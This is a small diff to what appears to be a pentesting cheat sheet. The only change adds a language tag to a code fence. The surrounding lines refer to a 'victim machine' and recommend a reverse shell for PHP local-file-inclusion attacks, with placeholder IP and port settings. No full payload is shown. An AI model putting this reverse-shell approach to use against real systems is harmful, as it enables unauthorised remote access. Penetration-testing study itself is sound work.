@@ -33,7 +33,7 @@ _if you encounter missing ld error while compiling at victim machine, try checki
 Works like a charm in linux php LFI situations better than `system('<reverse shell bash code>');`
 
 1. modify code
-```
+```c
 $ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 ```
